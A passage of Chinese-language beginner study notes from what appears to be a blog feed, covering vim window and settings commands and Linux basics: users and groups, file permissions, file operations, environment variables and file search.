<li>普通模式下<code>Ctrl-w q</code>  即 :q 结束分割出来的视窗。如果在新视窗中有输入需要使用强制符！即:q!</li>
<li>普通模式下<code>Ctrl-w o</code> 打开一个视窗并且隐藏之前的所有视窗</li>
<li>普通模式下<code>Ctrl-w j</code> 移至下面视窗</li>
<li>普通模式下<code>Ctrl-w k</code> 移至上面视窗</li>
<li>普通模式下<code>Ctrl-w h</code> 移至左边视窗</li>
<li>普通模式下<code>Ctrl-w l</code> 移至右边视窗</li>
<li>普通模式下<code>Ctrl-w J</code> 将当前视窗移至下面</li>
<li>普通模式下<code>Ctrl-w K</code> 将当前视窗移至上面</li>
<li>普通模式下<code>Ctrl-w H</code> 将当前视窗移至左边</li>
<li>普通模式下<code>Ctrl-w L</code> 将当前视窗移至右边</li>
<li>普通模式下<code>Ctrl-w -</code> 减小视窗的高度</li>
<li>普通模式下<code>Ctrl-w +</code> 增加视窗的高度</li>
</ul>
<h2><span id="文档加密">文档加密</span></h2><h3><span id="创建加密文档">创建加密文档</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vim -x file1</span><br></pre></td></tr></table></figure>
<h2><span id="在vim执行外部命令">在vim执行外部命令</span></h2><h2><span id="在vim执行外部命令">在vim执行外部命令</span></h2><p>在命令行模式中输入<code>!</code>可以执行外部的shell命令</p>
<ul>
<li><code>:!ls</code>  用于显示当前目录的内容</li>
<li><code>:!rm FILENAME</code>用于删除名为 FILENAME 的文件</li>
<li><code>:w FILENAME</code>可将当前 VIM 中正在编辑的文件另存为 FILENAME 文件</li>
</ul>
<h2><span id="帮助系统">帮助系统</span></h2><h3><span id="vim中的查看帮助">vim中的查看帮助</span></h3><ul>
<li>普通模式下按<code>F1</code>打开<code>vim</code>自己预设的帮助文档</li>
<li>命令行模式下输入<code>:h shiftwidth</code> 打开名为<code>shiftwidth</code>的帮助文件</li>
<li>命令行模式下输入<code>:ver</code> 显示版本及参数</li>
</ul>
<h2><span id="功能设定">功能设定</span></h2><h3><span id="vim的功能设定">vim的功能设定</span></h3><p>可以在编辑文件的时候进行功能设定，如命令行模式下输入<code>:set nu</code>（显示行数），设定值退出vim后不会保存。要永久保存配置需要修改vim配置文件。<br>vim的配置文件<code>~/.vimrc</code>，可以打开文件进行修改，不过务必小心不要影响vim正常使用</p>
<h3><span id="获取目前的设定">获取目前的设定</span></h3><ul>
<li>命令行模式下输入<code>:set</code>或者<code>:se</code>显示所有修改过的配置</li>
<li>命令行模式下输入<code>:set all</code> 显示所有的设定值</li>
<li>命令行模式下输入<code>:set option?</code> 显示option的设定值</li>
<li>命令行模式下输入<code>:set nooption</code> 取消当期设定值</li>
</ul>
<h3><span id="set功能的说明">set功能的说明</span></h3><ul>
<li>命令行模式下输入<code>:set autoindent(ai)</code> 设置自动缩进</li>
<li>命令行模式下输入<code>:set autowrite(aw)</code> 设置自动存档，默认未打开</li>
<li>命令行模式下输入<code>:set background=dark</code>或<code>light</code>，设置背景风格</li>
<li>命令行模式下输入<code>:set backup(bk)</code> 设置自动备份，默认未打开</li>
<li>命令行模式下输入<code>: set cindent(cin)</code> 设置C语言风格缩进</li>
</ul>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux基础入门笔记]]></title>
      <url>https://uknowsec.cn/posts/notes/Linux%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h1><span id="基本概念及操作">基本概念及操作</span></h1><h2><span id="一些常用快捷键">一些常用快捷键</span></h2><table>
<thead>
<tr>
<th>按键</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>Ctrl+d</td>
<td style="text-align:left">键盘输入结束或退出终端</td>
</tr>
<tr>
<td>Ctrl+s</td>
<td style="text-align:left">暂定当前程序，暂停后按下任意键恢复运行</td>
</tr>
<tr>
<td>Ctrl+z</td>
<td style="text-align:left">将当前程序放到后台运行，恢复到前台为命令fg</td>
</tr>
<tr>
<td>Ctrl+a</td>
<td style="text-align:left">将光标移至输入行头，相当于Home键</td>
</tr>
<tr>
<td>Ctrl+e</td>
<td style="text-align:left">将光标移至输入行末，相当于End键</td>
</tr>
<tr>
<td>Ctrl+k</td>
<td style="text-align:left">删除从光标所在位置到行末</td>
</tr>
<tr>
<td>Alt+Backspace</td>
<td style="text-align:left">向前删除一个单词</td>
</tr>
<tr>
<td>Shift+PgUp</td>
<td style="text-align:left">将终端显示向上滚动</td>
</tr>
<tr>
<td>Shift+PgDn</td>
<td style="text-align:left">将终端显示向下滚动</td>
</tr>
</tbody>
</table>
<h2><span id="shell常用通配符">Shell常用通配符</span></h2><table>
<thead>
<tr>
<th>字符</th>
<th style="text-align:left">含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>*</td>
<td style="text-align:left">匹配 0 或多个字符</td>
</tr>
<tr>
<td>?</td>
<td style="text-align:left">匹配任意一个字符</td>
</tr>
<tr>
<td>[list]</td>
<td style="text-align:left">匹配 list 中的任意单一字符</td>
</tr>
<tr>
<td>[!list]</td>
<td style="text-align:left">匹配 除list 中的任意单一字符以外的字符</td>
</tr>
<tr>
<td>[c1-c2]</td>
<td style="text-align:left">匹配 c1-c2 中的任意单一字符 如：[0-9] [a-z]</td>
</tr>
<tr>
<td>{string1,string2,…}</td>
<td style="text-align:left">匹配 sring1 或 string2 (或更多)其一字符串</td>
</tr>
<tr>
<td>{c2..c2}</td>
<td style="text-align:left">匹配 c1-c2 中全部字符 如{1..10}</td>
</tr>
</tbody>
</table>
<h1><span id="用户及文件权限管理">用户及文件权限管理</span></h1><h2><span id="查看用户">查看用户</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ who am i</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">$ who mom likes</span><br></pre></td></tr></table></figure>
<p>who 命令其他常用参数</p>
<table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>-a</td>
<td style="text-align:left">打印能打印的全部</td>
</tr>
<tr>
<td>-d</td>
<td style="text-align:left">打印死掉的进程</td>
</tr>
<tr>
<td>-m</td>
<td style="text-align:left">同am i,mom likes</td>
</tr>
<tr>
<td>-q</td>
<td style="text-align:left">打印当前登录用户数及用户名</td>
</tr>
<tr>
<td>-u</td>
<td style="text-align:left">打印当前登录用户登录信息</td>
</tr>
<tr>
<td>-r</td>
<td style="text-align:left">打印运行等级</td>
</tr>
</tbody>
</table>
<h2><span id="创建用户">创建用户</span></h2><p>在Linxu系统里，root账户拥护整个系统至高无上的权利，比如 新建/添加用户。</p>
<h3><span id="susu-与sudo">su,su-与sudo</span></h3><p>su <user>可以切换到用户user，执行时需要输入目标用户的密码，sudo <cmd>可以以特权级别运行cmd命令，需要当前用户属于sudo组，且需要输入当前用户密码。su - <user>命令也是切换用户，同时环境变量也会跟着改变成目标用户的环境变量。</user></cmd></user></p>
<p>新建用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo adduser lilei</span><br></pre></td></tr></table></figure></p>
<p>切换登录用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ su -l lilei</span><br></pre></td></tr></table></figure></p>
<p>退出当前用户跟退出终端一样可以使用 exit 命令或者使用快捷键 Ctrl+d。</p>
<h2><span id="用户组">用户组</span></h2><h3><span id="查看所属用户组">查看所属用户组</span></h3><p>方法一：使用groups命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ groups lilei</span><br></pre></td></tr></table></figure></p>
<p>方法二：查看etc/group文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/group | sort</span><br></pre></td></tr></table></figure></p>
<p>cat 命令用于读取指定文件的内容并打印到终端输出， | sort 表示将读取的文本进行一个字典排序再输出，然后你将看到如下一堆输出<br>可以使用命令过滤掉一些你不想看到的结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/group | grep -E &quot;用户名&quot;</span><br></pre></td></tr></table></figure></p>
<h3><span id="etcgroup-文件格式说明">etc/group 文件格式说明</span></h3><p>/etc/group 的内容包括用户组（Group）、用户组口令、GID 及该用户组所包含的用户（User），每个用户组一条记录。格式如下：</p>
<blockquote>
<p>group_name:password:GID:user_list</p>
</blockquote>
<p>你看到上面的 password 字段为一个 ‘x’ 并不是说密码就是它，只是表示密码不可见而已。</p>
<h3><span id="将其它用户加入-sudo-用户组">将其它用户加入 sudo 用户组</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ su -l lilei</span><br><span class="line">$ sudo ls</span><br></pre></td></tr></table></figure>
<h2><span id="删除用户">删除用户</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo deluser lilei --remove-home</span><br></pre></td></tr></table></figure>
<h2><span id="查看文件权限">查看文件权限</span></h2><p>使用较长格式列出文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ls -l</span><br></pre></td></tr></table></figure></p>
<p>图解：</p>
<p><img src="https://dn-anything-about-doc.qbox.me/linux_base/3-9.png/logoblackfont" alt=""></p>
<p>可能你还是不太明白，比如第一项文件类型和权限那一堆东西具体指什么，链接又是什么，何为最后修改时间，下面一一道来：</p>
<p><img src="https://dn-anything-about-doc.qbox.me/linux_base/3-10.png/logoblackfont" alt=""></p>
<ul>
<li>文件类型</li>
</ul>
<p>关于文件类型，这里有一点你必需时刻牢记<strong>Linux 里面一切皆文件</strong>，正因为这一点才有了设备文件（ <code>/dev</code> 目录下有各种设备文件，大都跟具体的硬件设备相关）这一说，还有 <code>socket</code>（网络套接字，具体是什么，感兴趣的用户可以自己去了解或期待实验楼的后续相关课程），和 <code>pipe</code> (管道，这个东西很重要，我们以后将会讨论到，这里你先知道有它的存在即可)。软链接文件，链接文件是分为两种的，另一种当然是“硬链接”(硬链接不常用，具体内容不作为本课程讨论重点，而软链接等同于 Windows 上的快捷方式,你记住这一点就够了）</p>
<ul>
<li>文件权限</li>
</ul>
<p>读权限，表示你可以使用 <code>cat &amp;lt;file name&amp;gt;</code> 之类的命令来读取某个文件的内容;写权限，表示你可以编辑和修改某个文件；<br>执行权限，通常指可以运行的二进制程序文件或者脚本文件，如同 Windows 上的 ‘exe’ 后缀的文件，不过 Linux 上不是通过文件后缀名来区分文件的类型。你需要注意的一点是，<strong>一个目录要同时具有读权限和执行权限才可以打开，而一个目录要有写权限才允许在其中创建其它文件</strong>，这是因为目录文件实际保存着该目录里面的文件的列表等信息</p>
<p>所有者权限，这一点相信你应该明白了，至于所属用户组权限，是指你所在的用户组中的所有其它用户对于该文件的权限，比如，你有一个艾派德,那么这个用户组权限就决定了你的兄弟姐妹有没有权限使用它破坏它和占有它。</p>
<ul>
<li><p>链接数</p>
<blockquote>
<p>链接到该文件所在的 inode 结点的文件名数目（关于这个概念涉及到 Linux 文件系统的相关概念知识，不在本课程的讨论范围，感兴趣的用户可以自己去了解）。</p>
</blockquote>
</li>
<li><p>文件大小</p>
<blockquote>
<p>以 inode 结点大小为单位来表示的文件大小，你可以给 ls 加上 <code>-lh</code> 参数来更直观的查看文件的大小。</p>
</blockquote>
</li>
</ul>
<p>明白了文件权限的一些概念，我们顺带补充一下关于 <code>ls</code> 命令的一些其它常用的用法：</p>
<p><ul></ul></p>
<ul>
<li>显示除了 ‘.’(当前目录)，’..’ 上一级目录之外的所有包含隐藏文件（Linux 下以 ‘.’ 开头的文件为隐藏文件）</li>
</ul>
<p>可以同时使用“-A”和“-l”参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ls -Al</span><br></pre></td></tr></table></figure></p>
<p>查看某一个目录的完整属性，而不是显示目录里面的文件属性<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ls -dl &lt;目录名&gt;</span><br></pre></td></tr></table></figure></p>
<p>显示所有文件的大小<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ls -AsSh</span><br></pre></td></tr></table></figure></p>
<p>其中小 s 为显示文件大小，大 S 为按文件大小排序，若需要知道如何按其它方式排序</p>
<h2><span id="修改文件权限">修改文件权限</span></h2><p>对文件的权限做修改，这里有两种方式：</p><p></p>
<ul>
<li>方式一：二进制数字表示</li>
</ul>
<p><img src="https://dn-anything-about-doc.qbox.me/linux_base/3-14.png/logoblackfont" alt=""></p>
<p>每个文件的三组权限（拥有者，所属用户组，其他用户,<strong>记住这个顺序是一定的</strong>）就对应这一个 “rwx”，也就是一个 ‘7’ ,所以如果我要将文件“iphone6”的权限改为只有我自己可以用那么就这样:</p>
<p>为了演示，我先在文件里加点内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ echo &quot;echo \&quot;hello shiyanlou\&quot;&quot; &gt; iphone6</span><br></pre></td></tr></table></figure></p>
<p>然后修改权限：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ chmod 700 iphone6</span><br></pre></td></tr></table></figure>
<ul>
<li>方式二：加减赋值操作</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go-rw iphone</span><br></pre></td></tr></table></figure>
<p>‘g’’o’还有’u’，分别表示group，others，user，’+’，’-‘ 就分别表示增加和去掉相应的权限。</p>
<h2><span id="fhs">FHS</span></h2><blockquote>
<p>FHS（英文：Filesystem Hierarchy Standard 中文：文件系统层次结构标准），多数 Linux 版本采用这种文件组织形式，FHS 定义了系统中每个区域的用途、所需要的最小构成的文件和目录同时还给出了例外处理与矛盾处理。</p>
</blockquote>
<p><img src="https://dn-anything-about-doc.qbox.me/linux_base/4-1.png/logoblackfont" alt=""></p>
<p>FHS 是根据以往无数 Linux 用户和开发者的经验总结出来的，并且会维持更新，FHS 依据文件系统使用的频繁与否以及是否允许用户随意改动（注意，不是不能，学习过程中，不要怕这些），将目录定义为四种交互作用的形态，如下表所示：</p><br><img src="https://dn-anything-about-doc.qbox.me/linux_base/4-2.png/logoblackfont" alt=""><p></p>
<h1><span id="linux目录结构及文件基本操作">Linux目录结构及文件基本操作</span></h1><h2><span id="目录路径">目录路径</span></h2><h3><span id="路径">路径</span></h3><p>使用 <code>cd</code> 命令可以切换目录，在 Linux 里面使用 <code>.</code> 表示当前目录，<code>..</code> 表示上一级目录（**注意，还记得我们上一节介绍过的，以 <code>.</code> 开头的文件都是隐藏文件，所以这两个目录必然也是隐藏的，你可以使用 <code>ls -a</code> 命令查看隐藏文件）, <code>-</code> 表示上一次所在目录，<code>～</code> 通常表示当前用户的”home”目录。使用 <code>pwd</code> 命令可以获取当前所在路径（绝对路径）。</p><p></p>
<p>进入上一级目录：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ..</span><br></pre></td></tr></table></figure>
<p> 进入你的“home”目录：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~ </span><br><span class="line">或者 cd /home/你的用户名</span><br></pre></td></tr></table></figure>
<p>使用 <code>pwd</code> 获取当前路径：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure></p>
<h3><span id="绝对路径">绝对路径</span></h3><p>关于绝对路径，简单地说就是以根”/“目录为起点的完整路径，以你所要到的目录为终点，表现形式如：<br><code>/usr/local/bin</code>，表示根目录下的 usr 目录中的 local 目录中的 bin 目录。</p>
<h3><span id="相对路径">相对路径</span></h3><p>相对路径，也就是相对于你当前的目录的路径，相对路径是以当前目录 <code>.</code> 为起点，以你所要到的目录为终点，表现形式如：<br><code>usr/local/bin</code> （这里假设你当前目录为根目录）。你可能注意到，我们表示相对路径实际并没有加上表示当前目录的那个 <code>.</code> ，而是直接以目录名开头，因为这个 <code>usr</code> 目录为 <code>/</code> 目录下的子目录，是可以省略这个 <code>.</code> 的（以后会讲到一个类似不能省略的情况）；如果是当前目录的上一级目录，则需要使用 <code>..</code> ，比如你当前目录为“home”目录，根目录就应该表示为 <code>../../</code> ,表示上一级目录（”home”目录）的上一级目录（”/“目录）。</p>
<h2><span id="新建">新建</span></h2><h3><span id="新建空白文件">新建空白文件</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd ~</span><br><span class="line">$ touch test</span><br></pre></td></tr></table></figure>
<h3><span id="新建目录">新建目录</span></h3><p>创建名为”mydir”的空目录：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir mydir</span><br></pre></td></tr></table></figure></p>
<p>使用 -p 参数，同时创建父目录（如果不存在该父目录），如下我们同时创建一个多级目录（这在有时候安装软件，配置安装路径时非常有用）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir -p father/son/grandson</span><br></pre></td></tr></table></figure></p>
<h2><span id="复制">复制</span></h2><h3><span id="复制文件">复制文件</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cp test father/son/grandson</span><br></pre></td></tr></table></figure>
<h3><span id="复制目录">复制目录</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cp -r father family</span><br></pre></td></tr></table></figure>
<p>加上-r或者-R参数，表示递归复制</p>
<h2><span id="删除">删除</span></h2><h3><span id="删除文件">删除文件</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ rm test</span><br></pre></td></tr></table></figure>
<p>-f 参数强制删除<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ rm -f test</span><br></pre></td></tr></table></figure></p>
<h3><span id="删除目录">删除目录</span></h3><p>删除一个目录，也需要加上-r或-R参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ rm -r family</span><br></pre></td></tr></table></figure></p>
<h2><span id="移动文件与文件重命名">移动文件与文件重命名</span></h2><h3><span id="移动文件">移动文件</span></h3><p>使用<code>mv</code>(move or rename files)命令，移动文件（剪切）。将文件”file1”移动到”Documents”目录<code>mv 源目录文件 目的目录</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir Documents</span><br><span class="line">$ mv file1 Documents</span><br></pre></td></tr></table></figure></p>
<h3><span id="重命名文件">重命名文件</span></h3><p>将文件”file1”重命名为”myfile” <code>mv 旧的文件名 新的文件名</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mv file1 myfile</span><br></pre></td></tr></table></figure></p>
<h3><span id="批量重命名">批量重命名</span></h3><p>使用一个看起来更专业的命令rename来实现。不过它是要用 perl 正则表达式来作为参数，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 使用通配符批量创建 5 个文件</span><br><span class="line">$ touch file&#123;1..5&#125;.txt</span><br><span class="line"></span><br><span class="line"># 批量将这 5 个后缀为 .txt 的文本文件重命名为以 .c 为后缀的文件</span><br><span class="line">$ rename &apos;s/\.txt/\.c/&apos; *.txt</span><br><span class="line"></span><br><span class="line"># 批量将这 5 个文件，文件名改为大写</span><br><span class="line">$ rename &apos;y/a-z/A-Z/&apos; *.c</span><br></pre></td></tr></table></figure>
<p>rename是先使用第二个参数的通配符匹配所有后缀为.txt的文件，然后使用第一个参数提供的正则表达式将匹配的这些文件的.txt后缀替换为.c，</p>
<h2><span id="查看文件">查看文件</span></h2><h3><span id="使用cattac和nl命令查看文件">使用<code>cat</code>,<code>tac</code>和<code>nl</code>命令查看文件</span></h3><p><code>cat</code>为正序显示，<code>tac</code>倒序显示。</p>
<p>cat 加上<code>-n</code>参数显示行号：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat -n passwd</span><br></pre></td></tr></table></figure></p>
<p>nl 的几个参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-b : 指定添加行号的方式，主要有两种：</span><br><span class="line">    -b a:表示无论是否为空行，同样列出行号(&quot;cat -n&quot;就是这种方式)</span><br><span class="line">    -b t:只列出非空行的编号并列出（默认为这种方式）</span><br><span class="line">-n : 设置行号的样式，主要有三种：</span><br><span class="line">    -n ln:在行号字段最左端显示</span><br><span class="line">    -n rn:在行号字段最右边显示，且不加 0</span><br><span class="line">    -n rz:在行号字段最右边显示，且加 0</span><br><span class="line">-w : 行号字段占用的位数(默认为 6 位)</span><br></pre></td></tr></table></figure></p>
<h3><span id="使用more和less命令分页查看文件">使用<code>more</code>和<code>less</code>命令分页查看文件</span></h3><p>使用<code>more</code>工具打开<code>passwd</code>文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ more passwd</span><br></pre></td></tr></table></figure></p>
<p>可以使用Enter键向下滚动一行，使用Space键向下滚动一屏，按下h显示帮助，q退出。</p>
<h3><span id="使用head和tail命令查看文件">使用<code>head</code>和<code>tail</code>命令查看文件</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tail /etc/passwd</span><br></pre></td></tr></table></figure>
<p>加上-n参数，后面紧跟行数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tail -n 1 /etc/passwd</span><br></pre></td></tr></table></figure></p>
<h2><span id="查看文件类型">查看文件类型</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ file /bin/ls</span><br></pre></td></tr></table></figure>
<h1><span id="环境变量与文件查找">环境变量与文件查找</span></h1><h2><span id="环境变量">环境变量</span></h2><h3><span id="变量">变量</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ declare tmp      #使用declare命令创建一个变量名为tmp的变量</span><br><span class="line">$ tmp=shiyanlou    #使用=号赋值运算符为变量 tmp 赋值为 shiyanlou</span><br><span class="line">$ echo $tmp        #读取变量的值，使用echo命令和$符号</span><br></pre></td></tr></table></figure>
<p>注意:关于变量名，并不是任何形式的变量名都是可用的，变量名只能是英文字母,数字或者下划线，且不能以数字作为开头</p>
<h3><span id="环境变量">环境变量</span></h3><p>在所有的 UNIX 和类 UNIX 系统中，每个进程都有其各自的环境变量设置，且默认情况下，当一个进程被创建时，处理创建过程中明确指定的话，它将继承其父进程的绝大部分环境设置。Shell 程序也作为一个进程运行在操作系统之上，而我们在  Shell中运行的大部分命令都将以 Shell 的子进程的方式运行。</p><br><img src="https://dn-anything-about-doc.qbox.me/linux_base/5-2.png/logoblackfont" alt=""><p></p>
<p>环境变量有三种：</p>
<ul>
<li>当前 Shell 进程私有用户自定义变量，如上面我们创建的 temp 变量，只在当前 Shell 中有效。</li>
<li>Shell 本身内建的变量。</li>
<li>从自定义变量导出的环境变量。</li>
</ul>
<table>
<thead>
<tr>
<th>命令</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>set</td>
<td style="text-align:left">显示当前 Shell 所有环境变量，包括其内建环境变量（与 Shell 外观等相关），用户自定义变量及导出的环境变量</td>
</tr>
<tr>
<td>env</td>
<td style="text-align:left">显示与当前用户相关的环境变量，还可以让命令在指定环境中运行</td>
</tr>
<tr>
<td>export</td>
<td style="text-align:left">显示从 Shell 中导出成环境变量的变量，也能通过它将自定义变量导出为环境变量</td>
</tr>
</tbody>
</table>
<p><img src="https://dn-anything-about-doc.qbox.me/linux_base/5-3.png/logoblackfont" alt=""></p>
<p><img src="https://dn-anything-about-doc.qbox.me/linux_base/5-5.png/logoblackfont" alt=""><br><strong>注意：为了与普通变量区分，通常我们习惯将环境变量名设为大写</strong></p>
<h3><span id="命令的查找路径与顺序">命令的查找路径与顺序</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ echo $PATH     #查看PATH环境变量的内容</span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games</span><br></pre></td></tr></table></figure>
<h3><span id="添加自定义路径到path环境变量">添加自定义路径到”PATH”环境变量</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ PATH=$PATH:/home/shiyanlou/mybin                     #PATH里面的路径是以：作为分隔符</span><br><span class="line">.zshrc      #zsh的配置文件</span><br><span class="line">.bashrc     #bashrc的配置文件</span><br><span class="line">$ echo &quot;PATH=$PATH:/home/shiyanlou/mybin&quot; &gt;&gt; .zshrc    #添加内容到.zshrc</span><br><span class="line">&gt;&gt;          #表示将标准输出以追加的方式重定向到一个文件中</span><br><span class="line">&gt;           #是以覆盖的方式重定向到一个文件</span><br></pre></td></tr></table></figure>
<h3><span id="修改和删除已有变量">修改和删除已有变量</span></h3><h4><span id="变量修改">变量修改</span></h4><p>修改方式</p>
<table>
<thead>
<tr>
<th>变量设置方式</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>${变量名#匹配字串}</td>
<td style="text-align:left">从头向后开始匹配，删除符合匹配字串的最短数据</td>
</tr>
<tr>
<td>${变量名##匹配字串}</td>
<td style="text-align:left">从头向后开始匹配，删除符合匹配字串的最长数据</td>
</tr>
<tr>
<td>${变量名%匹配字串}</td>
<td style="text-align:left">从尾向前开始匹配，删除符合匹配字串的最短数据</td>
</tr>
<tr>
<td>${变量名%%匹配字串}</td>
<td style="text-align:left">从尾向前开始匹配，删除符合匹配字串的最长数据</td>
</tr>
<tr>
<td>${变量名/旧的字串/新的字串}</td>
<td style="text-align:left">将符合旧字串的第一个字串替换为新的字串</td>
</tr>
<tr>
<td>${变量名//旧的字串/新的字串}</td>
<td style="text-align:left">将符合旧字串的全部字串替换为新的字串</td>
</tr>
</tbody>
</table>
<h3><span id="变量删除">变量删除</span></h3><p>可以使用<code>unset</code>命令删除一个环境变量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ unset temp</span><br></pre></td></tr></table></figure></p>
<h2><span id="环境变量生效">环境变量生效</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ source .zshrc             #使用source命令来让变量立即生效</span><br><span class="line">$ . ./.zshrc                # .的作用和source一样  注意：第一个点后面有一个空格，而且后面的文件必须指定完整的绝对或相对路径名</span><br></pre></td></tr></table></figure>
<h2><span id="搜索文件">搜索文件</span></h2><p>常见的命令：<code>whereis</code>，<code>which</code>,<code>find</code>,<code>locata</code></p>
<ul>
<li><p><code>whereis</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$whereis who        #直接从数据库中查询，只能搜索二进制文件（-b）,man帮助文件（-m）和源代码（-s）。</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>locate</code></p>
